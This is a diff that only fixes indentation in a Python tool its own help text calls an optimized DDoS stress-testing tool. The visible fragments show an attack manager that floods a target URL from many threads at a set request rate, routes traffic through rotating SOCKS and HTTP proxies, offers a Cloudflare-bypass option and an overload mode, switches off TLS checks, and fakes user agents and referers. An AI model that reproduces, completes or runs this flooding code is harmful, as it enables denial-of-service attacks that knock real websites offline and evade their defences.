@@ -106,15 +106,15 @@ class HTTPHeaderGenerator:
     
     # 默认配置，当配置文件不存在时使用
     DEFAULT_ACCEPT_HEADERS = [
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
-		"Accept-Encoding: gzip, deflate\r\n",
+        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
+        "Accept-Encoding: gzip, deflate\r\n",
         "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
     ]
     
     DEFAULT_REFERERS = [
-	"https://www.google.com/search?q=",
-	"https://www.facebook.com/",
-	"https://www.youtube.com/",
+        "https://www.google.com/search?q=",
+        "https://www.facebook.com/",
+        "https://www.youtube.com/",
         "https://www.bing.com/search?q="
     ]
     
@@ -206,7 +206,7 @@ class HTTPHeaderGenerator:
     def generate_post_header(self, target: str, path: str, data: str, cookies: str = "") -> str:
         """生成POST请求头部"""
         post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
-		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
         referer = f"Referer: http://{target}{path}\r\n"
         user_agent = f"User-Agent: {UserAgentGenerator.generate()}\r\n"
         accept = random.choice(self.ACCEPT_HEADERS)
@@ -229,13 +229,13 @@ class URLParser:
         url = url.strip()
         path = "/"
         port = 80
-	protocol = "http"
+        protocol = "http"
         
         if url.startswith("http://"):
             url = url[7:]
         elif url.startswith("https://"):
             url = url[8:]
-		protocol = "https"
+            protocol = "https"
             port = 443
         
         parts = url.split("/")
@@ -245,7 +245,7 @@ class URLParser:
         if ":" in website:
             target, port_str = website.split(":")
             port = int(port_str)
-	else:
+        else:
             target = website
         
         # 解析路径
@@ -325,7 +325,7 @@ class ConnectionPool:
         if not SOCKS_AVAILABLE:
             raise Exception("SOCKS代理不可用，请安装PySocks: pip install PySocks")
         
-			s = socks.socksocket()
+            s = socks.socksocket()
         
         # 设置代理类型
         if self.config.proxy_type == "socks4":
@@ -336,7 +336,7 @@ class ConnectionPool:
         # 超负荷模式优化
         if self.config.overload_mode:
             s.settimeout(1)  # 极短超时
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             # 设置接收缓冲区
@@ -392,7 +392,7 @@ class ConnectionPool:
             s.close()
             raise Exception(f"HTTP代理连接失败: {response}")
         
-			if protocol == "https":
+        if protocol == "https":
             ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
@@ -419,7 +419,7 @@ class ConnectionPool:
         try:
             # 简单检查socket状态
             return conn.fileno() != -1
-			except:
+        except:
             return False
     
     def cleanup(self):
@@ -429,7 +429,7 @@ class ConnectionPool:
                 try:
                     conn = pool.get_nowait()
                     conn.close()
-		except:
+                except:
                     pass
         self.pools.clear()
         self.active_connections = 0
@@ -497,17 +497,17 @@ class ProxyManager:
                 host, proxy_port = proxy_str.split(':')
                 proxy_port = int(proxy_port)
                 
-			s = socks.socksocket()
+                s = socks.socksocket()
                 s.set_proxy(socks.SOCKS5, host, proxy_port)
                 s.settimeout(timeout)
                 s.connect((target, port))
                 
-			if protocol == "https":
-				ctx = ssl.SSLContext()
+                if protocol == "https":
+                    ctx = ssl.SSLContext()
                     s = ctx.wrap_socket(s, server_hostname=target)
                 
                 s.send(b"GET / HTTP/1.1\r\n\r\n")
-				s.close()
+                s.close()
                 valid_proxies.append(proxy_str)
                 
             except Exception:
@@ -563,19 +563,19 @@ class AttackManager:
             raise Exception("没有可用代理")
         
         s = None
-		try:
-			s = socks.socksocket()
+        try:
+            s = socks.socksocket()
             s.set_proxy(socks.SOCKS5, proxy[0], proxy[1])
             s.settimeout(self.config.connection_timeout)
             
             # CF绕过优化：设置TCP选项
             if self.config.cf_bypass:
-				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                 
             s.connect((target, port))
             
-			if protocol == "https":
+            if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
@@ -592,8 +592,8 @@ class AttackManager:
         finally:
             if s:
                 try:
-				s.close()
-			except:
+                    s.close()
+                except:
                     pass
     
     def attack_worker(self, mode: str, target: str, path: str, port: int, protocol: str, 
@@ -662,7 +662,7 @@ class AttackManager:
         for conn in connection_cache.values():
             try:
                 conn.close()
-		except:
+            except:
                 pass
     
     def _normal_worker(self, mode: str, target: str, path: str, port: int, protocol: str,
@@ -695,11 +695,11 @@ class AttackManager:
                     return conn, proxy_str
                 else:
                     raise Exception("连接已关闭")
-		except:
+            except:
                 # 连接失效，移除
                 try:
                     conn.close()
-			except:
+                except:
                     pass
                 del cache[proxy_str]
         
@@ -710,7 +710,7 @@ class AttackManager:
             if self.config.tcp_nodelay or self.config.disable_nagle:
                 try:
                     conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			except:
+                except:
                     pass
             
             # 缓存连接
@@ -875,7 +875,7 @@ class AttackManager:
         self.proxy_manager.load_proxies()
         if len(self.proxy_manager.proxies) == 0:
             self.logger.error("没有可用代理")
-		return
+            return
         
         self.running = True
         
@@ -971,7 +971,7 @@ class AttackManager:
                                     conn = pool.get_nowait()
                                     conn.close()
                                 except:
-			break
+                                    break
                                     
             except Exception as e:
                 self.logger.debug(f"内存管理错误: {e}")
@@ -987,10 +987,10 @@ class AttackManager:
             print(f"\r当前RPS: {rps}, 总请求: {current_total}", end="", flush=True)
             time.sleep(1)
 
-	
+    
 def main():
     """主函数"""
-	parser = argparse.ArgumentParser(
+    parser = argparse.ArgumentParser(
         description="优化版DDoS压力测试工具",
         epilog="使用示例: python3 main_optimized.py cc https://example.com 100 10"
     )
@@ -1014,7 +1014,7 @@ def main():
     parser.add_argument('--proxy-type', choices=['socks5', 'socks4', 'http'], default='socks5', help="代理类型")
     parser.add_argument('--http-proxy-file', help="HTTP代理文件路径")
     
-	args = parser.parse_args()
+    args = parser.parse_args()
 
     # 创建配置
     config = Config(
@@ -1043,12 +1043,12 @@ def main():
         attack_manager.proxy_manager.load_proxies()
         attack_manager.proxy_manager.check_proxies(target, port, protocol)
         print("代理检查完成")
-	else:
+    else:
         # 启动攻击
         attack_manager.start_attack(
             args.mode, args.url, args.threads, args.rps, args.cookies
         )
-	
+    
 
 if __name__ == "__main__":
-	main()
+    main()
